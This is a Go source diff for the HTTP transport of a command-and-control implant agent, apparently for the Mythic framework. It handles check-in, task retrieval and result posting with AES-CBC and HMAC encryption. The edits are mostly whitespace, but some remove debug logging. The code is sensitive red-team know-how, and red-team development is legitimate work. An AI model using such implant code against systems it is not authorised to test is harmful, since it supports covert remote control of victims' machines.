@@ -132,7 +132,7 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 			// log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
 			return fmt.Errorf("failed to decode checkin response: %w", err)
 		}
-		
+
 		// Decrypt the response
 		decryptedResponse, err = h.decryptResponse(decodedData)
 		if err != nil {
@@ -236,7 +236,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		if err != nil {
 			return nil, fmt.Errorf("failed to decode response: %w", err)
 		}
-		
+
 		// Decrypt the decoded data
 		decryptedData, err = h.decryptResponse(decodedData)
 		if err != nil {
@@ -332,12 +332,12 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 		if h.Debug {
 			// log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
 		}
-		
+
 		// Try HMAC on IV + ciphertext (alternative method for Mythic)
 		mac3 := hmac.New(sha256.New, key)
-		mac3.Write(encryptedData[36:len(encryptedData)-32]) // IV + ciphertext
+		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
 		expectedHmac3 := mac3.Sum(nil)
-		
+
 		if !hmac.Equal(hmacBytes, expectedHmac3) {
 			return nil, fmt.Errorf("HMAC verification failed with all methods")
 		}
@@ -418,28 +418,20 @@ func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Age
 
 	// Read response body
 	respBody, _ := io.ReadAll(resp.Body)
-	
-	if resp.StatusCode != http.StatusOK {
-		log.Printf("[DEBUG] Post response failed with status: %d, body: %s", resp.StatusCode, string(respBody))
-		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
-	}
 
-	if h.Debug {
-		log.Printf("[DEBUG] Post response raw result: %s", string(respBody))
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
 	}
 
 	// Decrypt the response if encryption key is provided (same as GetTasking)
 	var decryptedData []byte
 	if h.EncryptionKey != "" {
-		if h.Debug {
-			log.Printf("[DEBUG] Decrypting PostResponse result...")
-		}
 		// First, base64 decode the response
 		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
 		if err != nil {
 			return nil, fmt.Errorf("failed to decode PostResponse: %w", err)
 		}
-		
+
 		// Decrypt the decoded data
 		decryptedData, err = h.decryptResponse(decodedData)
 		if err != nil {
@@ -469,7 +461,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		// One has slash, just concatenate
 		url = h.BaseURL + path
 	}
-	
+
 	if h.Debug {
 		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
 	}
@@ -498,7 +490,7 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		// log.Printf("[DEBUG] HTTP request failed: %v", err)
 		return nil, fmt.Errorf("HTTP request failed: %w", err)
 	}
-	
+
 	return resp, nil
 }
 
@@ -517,7 +509,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 	if h.EncryptionKey == "" {
 		return msg
 	}
-	
+
 	// Decode the base64 key
 	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
 	if err != nil {
@@ -526,7 +518,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 		}
 		return msg
 	}
-	
+
 	// Create AES cipher
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -535,7 +527,7 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 		}
 		return msg
 	}
-	
+
 	// Generate random IV
 	iv := make([]byte, aes.BlockSize)
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
@@ -544,10 +536,10 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 		}
 		return msg
 	}
-	
+
 	// Create CBC encrypter
 	mode := cipher.NewCBCEncrypter(block, iv)
-	
+
 	// Pad the message to block size
 	padded, err := pkcs7Pad(msg, aes.BlockSize)
 	if err != nil {
@@ -556,19 +548,19 @@ func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
 		}
 		return msg
 	}
-	
+
 	// Encrypt the message
 	encrypted := make([]byte, len(padded))
 	mode.CryptBlocks(encrypted, padded)
-	
+
 	// Freyja format: IV + Ciphertext
 	ivCiphertext := append(iv, encrypted...)
-	
+
 	// Create HMAC of IV + Ciphertext
 	hmacHash := hmac.New(sha256.New, key)
 	hmacHash.Write(ivCiphertext)
 	hmacBytes := hmacHash.Sum(nil)
-	
+
 	// Freyja format: IV + Ciphertext + HMAC
 	return append(ivCiphertext, hmacBytes...)
 }
